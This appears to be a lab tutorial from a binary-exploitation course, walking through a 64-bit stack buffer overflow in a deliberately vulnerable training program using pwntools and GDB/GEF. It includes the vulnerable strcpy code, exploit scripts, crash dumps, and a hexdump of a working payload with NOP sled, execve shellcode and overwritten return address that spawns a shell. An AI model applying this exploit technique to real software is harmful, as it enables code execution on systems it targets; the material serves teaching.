# Development of a buffer overflow exploit - 64 bit

## Introduction

We will create a functional exploit for a64 bit program with a stack overflow vulnerability,
nearly identical with challenge11. But this time we use pwntools Python library, and GEF
GDB plugin to make the whole process easier. 


### Source

* Source directory: `~/challenges/challenge12/`
* Source files: [challenge12](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge12)

You can compile it by calling `make` in the folder `~/challenges/challenge12`

The source is similar to challenge10. Same vulnerability, but different input vector.


### Vulnerability

Reminder: the vulnerability lies in the function `handleData()`:

```c
void handleData(char *username, char *password) {
    char name[128];
    ...
    strcpy(name, username);
    ...
}

int main(int argc, char **argv) {
    char username[1024];
	...
	printf("Username: "); fflush(stdout);
    read(0, username, sizeof(username));

    printf("Password: "); fflush(stdout);
    read(0, password, sizeof(password));

    handleData(username, password);
}
```

What has been changed is that the arguments in the previous challenges are now read from the keyboard. 
The program does not have any command line arguments:
```
~/challenges/challenge12$ ./challenge12 
Username: Test
Password: password123
Not admin.
```


## Pwntools

From now on we will use the [pwntools library](https://docs.pwntools.com/en/stable/) to write our exploits. 
For this challenge, it will make it easier to interact with the vulnerable program.

The exploit would look someting like this:
```python
from pwn import *

io = process("./challenge12")

exploit = b'A' * 128

io.sendafter(b"Username: ", exploit)
io.sendafter(b"Password: ", b'password')

print(str(io.read()))
```

`io=process()` will create a process, and `io.sendafter("A", "B")` will wait for "A" to appear
from the program on stdout, and write "B" into stdin.

It will generate the following output:
```
[+] Starting local process './challenge12': pid 1085697
b'Not admin.\n'
[*] Stopped process './challenge12' (pid 1085697)
```


## Pwntools debugging and GEF

We can automatically start GDB when executing the exploit, attached to the process. 
This makes exploit development much easier. We need to combine it with something like
`io.poll()` at the end of the script, so that the script does not exit when we are
still using GDB:

```python
io = process("./challenge12")
gdb.attach(io, 'continue')
...
io.poll(block=True)
```

Start a [tmux](https://gist.github.com/MohamedAlaa/2961058) session first by typing `tmux`
in the terminal. tmux will be used to show the output of GDB, in the lower half of the terminal. 
The focus, and therefore your keyboard input, will be the lower window automatically - inside
GDB. To quit, just type `quit` into GDB. Sometimes an additional `ctrl-c` is required.

Lets configure the exploit to overflow with `exploit = b'A' * 156`.

It will give something like this as output:
```
~/challenges/challenge12$ python3 challenge12-exploit.py
[+] Starting local process './challenge12': pid 315
[*] running in new terminal: ['/usr/bin/gdb', '-q', './challenge12', '315', '-x', '/tmp/pwn9lxo2ph7.gdb']
[+] Waiting for debugger: Done
b'You are admin!\n'



───────────────────────────────────────────────────────────────────────────────────────────────
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xf
$rbx   : 0x0
$rcx   : 0x007ffff7eb2f33  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x007fffffffe7c0  →  0x007fffffffece8  →  0x007fffffffeed9  →  "./challenge12"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x000000004052a0  →  "You are admin!\n"
$rdi   : 0x007ffff7f85670  →  0x0000000000000000
$rip   : 0x41414141
────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge12", stopped 0x41414141 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

GDB is now using GEF, to provide helpful tools when writing exploits. It will also show information
like the content of registers on every breakpoint automatically. This includes the `registers`,
and where they point to. `code` disassembly, which cannot be performed here (as at 0x41414141 
there is no code), and `threads` with the status of the program (we only use one thread). 

GDB debugging the program has been executed in the lower tmux window. The top window, above `Legend`,
is the python script output of `challenge12-exploit.py`. 

At the bottom, you can see it crashed with `RIP=0x41414141` because of a SIGSEGV, a segmentation fault. 
You can look around by using GDB commands. Once you are finished, exit gdb with `quit` or just `ctrl-d`. 


## Notes on finding the offset for 64 bit

The 64 bit RIP register on x64 bit cannot be fully utilized - the top most bytes have to be zero. 

This means that if you overflow too much, RIP will be set to some kind of "default" value. It will
look like this, using `offset=160`:

```
~/challenges/challenge12$ python3 challenge12-exploit.py
[+] Starting local process './challenge12': pid 476
[*] running in new terminal: ['/usr/bin/gdb', '-q', './challenge12', '476', '-x', '/tmp/pwnof4d7j52.gdb']
[+] Waiting for debugger: Done
b'You are admin!\n'

────────────────────────────────────────────────────────────────────────────────────────────────────
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xf
$rbx   : 0x0
$rcx   : 0x007ffff7eb2f33  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x007fffffffe7b8  →  "AAAAAAAA"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x000000004052a0  →  "You are admin!\n"
$rdi   : 0x007ffff7f85670  →  0x0000000000000000
$rip   : 0x00000000401265  →  <handleData+109> ret
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401264 <handleData+108> leave
 →   0x401265 <handleData+109> ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge12", stopped 0x401265 in handleData (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

While RIP is not set to `0x4141414141`, it crashed on the `ret` instruction, because the value for
RIP from the stack is invalid (too large). A good indicator we overflowed too much. 


## Writing the exploit

As before, you required to know three different things: 
* The offset to RIP
* The shellcode
* The location of the shellcode in memory

But now, you also need to write the python exploit itself. Use `challenge12-exploit.py` as basis for your exploit. 
And the knowledge of challenge11 to gather this information, and update the exploit accordingly. 
In more or less this order:
* Update the exploit so you can reliably crash the vulnerable program (should be prepared like this)
* Make sure you have the right offset to SIP (RIP is a known value)
* Replace the `exploit` variable with the real exploit pattern as in challenge11 (with NOPs, shellcode, garbage, SIP). Make sure to stay inside the 128 byte buffer
* Find the address of the exploit in memory

* See if the exploit executed `/bin/dash`
* If yes, disable debug commands in the exploit, and enjoy your fresh shell

Use the following shellcode: 
```
context.arch='amd64'
shellcode = asm(shellcraft.amd64.sh())
```

Use the shellcode in variable `main():username`, NOT `handleData():name` as SIP. The later will sadly not work with the provided shellcode!

Some tipps:
* `gdb.attach(io, 'continue')` the second argument are GDB commands. Remove the `continue` to interact with GDB on startup. Or add breakpoints like `b *handleData+75` directly
* You can re-use the exploit pattern function `make()` from `challenge11-exploit.py
* Use `io.interactive()` instead of `io.poll()` once the shellcode gets executed reliably
* set breakpoints on the end of handleData() to check if overwritten SIP points to your shellcode

If you have trouble, peek at `challenge12-solution.py`.


## Solution

```
~/challenges/challenge12$ python3 ./challenge12-solution.py
[+] Starting local process './challenge12': pid 1227
[*] running in new terminal: ['/usr/bin/gdb', '-q', './challenge12', '1227', '-x', '/tmp/pwn5jo4gg_r.gdb']
[+] Waiting for debugger: Done
Sending exploit:
00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000010  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000020  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000030  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000040  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000050  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
00000060  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
00000070  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
00000080  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000090  41 41 41 41  41 41 41 41  f0 e7 ff ff  ff 7f        │AAAA│AAAA│····│··│
0000009e
[*] Switching to interactive mode
You are admin!
$
────────────────────────────────────────────────────────────────────────────────────────────────────
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x0
$rcx   : 0x007ffff7eb2e8e  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x400
$rsp   : 0x007fffffffe7b8  →  0x0000000040131c  →  <main+193> mov edi, 0x4020be
$rbp   : 0x007fffffffebf0  →  0x00000000401380  →  <__libc_csu_init+0> push r15
$rsi   : 0x007fffffffe7f0  →  0x0000000000000000
$rdi   : 0x0
$rip   : 0x007ffff7eb2e8e  →  0x5a77fffff0003d48 ("H="?)
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7eb2e8c <read+12>        syscall
 → 0x7ffff7eb2e8e <read+14>        cmp    rax, 0xfffffffffffff000
   0x7ffff7eb2e94 <read+20>        ja     0x7ffff7eb2ef0 <__GI___libc_read+112>
   0x7ffff7eb2e96 <read+22>        ret
   0x7ffff7eb2e97 <read+23>        nop    WORD PTR [rax+rax*1+0x0]
─────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge12", stopped 0x7ffff7eb2e8e in __GI___libc_read (), reason: STOPPED
────────────────────────────────────────────────────────────────────────────────────────────────────
process 1227 is executing new program: /usr/bin/dash
```

pwntools starts GDB as usual in the bottom half. It executed `/usr/bin/dash/` successfully. 
Press `ctrl-b <up>` to change into the upper terminal. You can interact with the shell 
spawned by the shellcode by typing commands (at `$ `).

Press `ctrl-d` to exit the shell, which also closes GDB.


To make it easier, just add `NOPTRACE` argument. This will disable `gdb.attach()`:
```
~/challenges/challenge12$ python3 ./challenge12-solution.py NOPTRACE
[+] Starting local process './challenge12': pid 1253
[!] Skipping debug attach since context.noptrace==True
Sending exploit:
00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000010  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000020  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000030  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000040  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000050  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
00000060  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
00000070  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
00000080  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000090  41 41 41 41  41 41 41 41  f0 e7 ff ff  ff 7f        │AAAA│AAAA│····│··│
0000009e
[*] Switching to interactive mode
You are admin!
$ ls
Makefile     challenge12-exploit.py   challenge12.c
challenge12  challenge12-solution.py
```


## Things to think about

* If you use the shellcode in `handleData():name`, does it work? Why not?